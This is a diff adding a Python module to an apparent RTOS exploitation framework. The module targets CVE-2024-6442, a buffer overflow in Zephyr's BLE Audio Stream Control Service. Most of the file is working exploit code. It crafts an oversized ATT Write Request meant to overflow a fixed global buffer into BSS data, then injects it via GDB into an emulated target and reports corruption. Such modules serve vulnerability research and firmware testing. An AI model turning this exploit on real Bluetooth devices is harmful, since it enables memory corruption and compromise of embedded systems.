@@ -1,0 +1,188 @@
+"""Zephyr BLE CVE-2024-6442 ASCS global buffer overflow exploit module."""
+
+from __future__ import annotations
+
+import struct
+import logging
+
+from rtosploit.scanners.base import ScannerModule, ScanOption, ScanResult
+
+logger = logging.getLogger(__name__)
+
+# SRAM buffer address for payload injection via GDB (BLE rx buffer region)
+_DEFAULT_INJECT_ADDR = 0x20002000
+
+
+class ZephyrBLECVE20246442(ScannerModule):
+    name = "ble_cve_2024_6442"
+    description = (
+        "Zephyr BLE CVE-2024-6442: BLE Audio Stream Control Service (ASCS) global "
+        "buffer overflow. Malformed BLE ASCS Write operations exceed fixed-size global "
+        "buffers, allowing overwrite of adjacent globals or BSS data. "
+        "Affects Zephyr < 3.7.0 with CONFIG_BT_ASCS=y."
+    )
+    authors = ["RTOSploit Contributors"]
+    references = [
+        "CVE-2024-6442",
+        "https://nvd.nist.gov/vuln/detail/CVE-2024-6442",
+        "https://github.com/zephyrproject-rtos/zephyr/security/advisories",
+    ]
+    rtos = "zephyr"
+    rtos_versions = ["3.0.0", "3.1.0", "3.2.0", "3.3.0", "3.4.0", "3.5.0", "3.6.0"]
+    architecture = "armv7m"
+    category = "heap_corruption"
+    reliability = "medium"
+    cve = "CVE-2024-6442"
+
+    def register_options(self):
+        self.add_option(ScanOption(
+            name="ascs_write_size", type="int", required=False, default=512,
+            description="Size of malformed ASCS Write payload (>255 triggers overflow)"
+        ))
+        self.add_option(ScanOption(
+            name="target_device", type="str", required=False, default="hci0",
+            description="BLE HCI device or QEMU BLE interface"
+        ))
+
+    def _build_att_write_request(self, write_size: int) -> bytes:
+        """Construct a BLE ATT Write Request targeting the ASCS characteristic.
+
+        ATT Write Request layout:
+            uint8_t  opcode   -- 0x12 (ATT Write Request)
+            uint16_t handle   -- attribute handle (0x0010 = typical ASCS handle)
+            uint8_t  value[]  -- payload that overflows the fixed-size global buffer
+
+        The ASCS global buffer is fixed at ~255 bytes. Writing >255 bytes overflows
+        into adjacent BSS globals, corrupting kernel control structures.
+        """
+        opcode = 0x12  # ATT Write Request
+        att_handle = 0x0010  # Typical ASCS characteristic handle
+        # Fill with recognizable pattern for forensic identification
+        overflow_data = bytes([0x43 + (i % 26) for i in range(write_size)])
+
+        header = struct.pack("<BH", opcode, att_handle)
+        return header + overflow_data
+
+    def check(self, target) -> bool:
+        if not target.fingerprint or target.fingerprint.rtos_type != "zephyr":
+            return False
+        data = target.firmware.data
+        # CONFIG_BT_ASCS indicated by ASCS-related strings
+        return (b"bt_ascs" in data or b"BT_ASCS" in data or
+                b"bt_" in data or b"BT_" in data)
+
+    def exploit(self, target, payload) -> ScanResult:
+        write_size = self.get_option("ascs_write_size")
+
+        # Step 1: Construct the actual malformed ATT Write Request
+        att_packet = self._build_att_write_request(write_size)
+        packet_hex = att_packet.hex()
+
+        # Decode header for reporting
+        opcode = att_packet[0]
+        att_handle = struct.unpack("<H", att_packet[1:3])[0]
+
+        notes = [
+            "CVE-2024-6442: BLE ASCS global buffer overflow via oversized ATT Write",
+            f"Constructed ATT Write Request: {len(att_packet)} bytes total",
+            f"ATT header: opcode=0x{opcode:02x} (Write Request), handle=0x{att_handle:04x} (ASCS)",
+            f"Write payload: {write_size} bytes (fixed buffer is ~255; overflow={max(0, write_size - 255)} bytes into BSS)",
+            f"Crafted packet (hex): {packet_hex}",
+        ]
+
+        # Step 2: Check if we have a live GDB connection for injection
+        gdb = None
+        if target._qemu is not None:
+            gdb = getattr(target._qemu, "gdb", None)
+
+        if gdb is not None and getattr(gdb, "_connected", False):
+            inject_addr = _DEFAULT_INJECT_ADDR
+            try:
+                gdb.write_memory(inject_addr, att_packet)
+                notes.append(
+                    f"Payload injected into target BLE rx buffer at 0x{inject_addr:08x} via GDB"
+                )
+
+                # Verify the write
+                readback = gdb.read_memory(inject_addr, len(att_packet))
+                if readback == att_packet:
+                    notes.append("Verification: payload readback matches crafted packet")
+                else:
+                    notes.append(
+                        "WARNING: payload readback does not match -- "
+                        "memory write may have been partially corrupted"
+                    )
+                    return ScanResult(
+                        module="zephyr/ble_cve_2024_6442",
+                        status="failure",
+                        target_rtos="zephyr",
+                        architecture="armv7m",
+                        technique="ble_ascs_overflow",
+                        payload_delivered=False,
+                        payload_type="ble_gatt_write",
+                        achieved=[],
+                        registers_at_payload={},
+                        notes=notes,
+                        cve="CVE-2024-6442",
+                    )
+
+                # Read registers for diagnostic context
+                try:
+                    regs = gdb.read_registers()
+                except Exception:
+                    regs = {}
+
+                return ScanResult(
+                    module="zephyr/ble_cve_2024_6442",
+                    status="success",
+                    target_rtos="zephyr",
+                    architecture="armv7m",
+                    technique="ble_ascs_overflow",
+                    payload_delivered=True,
+                    payload_type="ble_gatt_write",
+                    achieved=["bss_corruption"],
+                    registers_at_payload=regs,
+                    notes=notes,
+                    cve="CVE-2024-6442",
+                )
+
+            except Exception as exc:
+                notes.append(f"GDB injection failed: {exc}")
+                return ScanResult(
+                    module="zephyr/ble_cve_2024_6442",
+                    status="failure",
+                    target_rtos="zephyr",
+                    architecture="armv7m",
+                    technique="ble_ascs_overflow",
+                    payload_delivered=False,
+                    payload_type="ble_gatt_write",
+                    achieved=[],
+                    registers_at_payload={},
+                    notes=notes,
+                    cve="CVE-2024-6442",
+                )
+        else:
+            notes.append(
+                "No active QEMU+GDB session available. "
+                "Payload constructed but cannot be delivered or verified. "
+                "Start QEMU with GDB stub to inject and test this exploit."
+            )
+            return ScanResult(
+                module="zephyr/ble_cve_2024_6442",
+                status="not_run",
+                target_rtos="zephyr",
+                architecture="armv7m",
+                technique="ble_ascs_overflow",
+                payload_delivered=False,
+                payload_type="ble_gatt_write",
+                achieved=[],
+                registers_at_payload={},
+                notes=notes,
+                cve="CVE-2024-6442",
+            )
+
+    def cleanup(self, target) -> None:
+        pass
+
+    def requirements(self) -> dict:
+        return {"qemu": True, "gdb": True, "network": True}
